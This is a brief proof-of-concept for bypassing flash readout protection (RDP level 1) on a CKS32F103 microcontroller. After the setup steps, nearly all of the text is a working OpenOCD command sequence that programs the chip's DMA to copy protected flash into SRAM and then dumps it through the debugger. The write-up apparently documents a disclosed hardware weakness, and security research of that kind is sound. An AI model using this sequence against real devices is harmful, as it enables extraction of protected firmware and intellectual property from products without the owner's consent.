D2 PoC for CKS32F103

Preparation:
	- Load some firmware into the DuT and enable flash security (readout-protection / RDP-level 1)

Attack execution:
	- Power up the board
	- Connect a debugger
	- Startup OpenOCD
	- Connect via "telnet localhost 4444" and execute:

	mww 0x40021014 0x00000015; #enable DMA clock
	mww 0x40020008 0x00004AC0; #DMA: 32-bit, mem2mem
	mww 0x4002000c 0x00004000; #read 0x4000 words
	mww 0x40020010 0x08000000; #read from 0x08000000
	mww 0x40020014 0x20000000; #write to 0x20000000
	mww 0x40020008 0x00004AC1; #start reading
	sleep 100; #wait for read
	mdw 0x20000000 0x1000; #read flash contents from SRAM